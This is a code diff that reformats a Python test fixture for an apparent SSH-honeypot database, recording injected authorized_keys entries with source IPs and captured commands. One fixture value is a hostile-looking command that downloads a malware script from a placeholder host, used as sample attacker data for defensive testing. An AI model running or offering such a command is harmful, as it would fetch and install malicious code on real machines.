@@ -94,24 +94,28 @@ def _create_test_keys(session: Session) -> None:
 
     # Create session associations
     for i in range(5):
-        session.add(SessionSSHKeys(
-            session_id=f"session_{i}",
-            ssh_key_id=key1.id,
-            injection_method="authorized_keys",
-            timestamp=datetime.now() - timedelta(days=10),
-            source_ip=f"192.168.1.{i}",
-            successful_injection=True,
-            command_text="echo 'test command'",
-        ))
-        session.add(SessionSSHKeys(
-            session_id=f"session_{i}",
-            ssh_key_id=key2.id,
-            injection_method="authorized_keys",
-            timestamp=datetime.now() - timedelta(days=10),
-            source_ip=f"192.168.1.{i}",
-            successful_injection=True,
-            command_text="wget http://example.com/malware.sh",
-        ))
+        session.add(
+            SessionSSHKeys(
+                session_id=f"session_{i}",
+                ssh_key_id=key1.id,
+                injection_method="authorized_keys",
+                timestamp=datetime.now() - timedelta(days=10),
+                source_ip=f"192.168.1.{i}",
+                successful_injection=True,
+                command_text="echo 'test command'",
+            )
+        )
+        session.add(
+            SessionSSHKeys(
+                session_id=f"session_{i}",
+                ssh_key_id=key2.id,
+                injection_method="authorized_keys",
+                timestamp=datetime.now() - timedelta(days=10),
+                source_ip=f"192.168.1.{i}",
+                successful_injection=True,
+                command_text="wget http://example.com/malware.sh",
+            )
+        )
 
     # Create key associations
     assoc1 = SSHKeyAssociations(
